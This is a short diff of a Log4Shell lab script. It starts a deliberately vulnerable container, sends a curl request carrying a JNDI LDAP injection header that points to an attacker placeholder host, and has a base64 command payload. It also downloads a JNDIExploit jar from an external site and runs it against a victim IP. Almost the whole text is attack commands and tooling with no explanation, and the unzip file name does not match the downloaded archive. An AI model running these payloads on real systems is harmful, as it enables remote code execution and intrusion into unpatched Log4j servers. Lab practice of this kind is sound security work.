@@ -13,7 +13,7 @@ https://rmccurdy.com/.scripts/downloaded/JNDIExploit.v1.2.pcap
     docker rm -f $(docker ps -a -q)  
     sleep 5  
     docker rmi -f $(docker images -q)  
-    docker run --name vulnerable-app -p 8080:8080 [ghcr.io/christophetd/log4shell-vulnerable-app](http://ghcr.io/christophetd/log4shell-vulnerable-app)  
+    docker run --name vulnerable-app -p 8080:8080 http://ghcr.io/christophetd/log4shell-vulnerable-app  
    
     #run in a loop (attacker)  
     curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://ATTACKERIP:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'  
@@ -21,8 +21,8 @@ https://rmccurdy.com/.scripts/downloaded/JNDIExploit.v1.2.pcap
     # setup jndi:ldap server (attacker)  
     # because Zero Fs given ...  
     killall -9 java  
-    wget -U NOTSPAMMER [https://rmccurdy.com/.scripts/downloaded/JNDIExploit.v1.2_RENAMED.zip](https://rmccurdy.com/.scripts/downloaded/JNDIExploit.v1.2_RENAMED.zip)  
-    unzip [JNDIExploit.v1.2.zip](http://jndiexploit.v1.2.zip/)  
+    wget -U NOTSPAMMER  https://rmccurdy.com/.scripts/downloaded/JNDIExploit.v1.2_RENAMED.zip
+    unzip JNDIExploit.v1.2.zip
     java -jar JNDIExploit-1.2-SNAPSHOT.jar -i VICTOM_IP -p 8080  
       
       
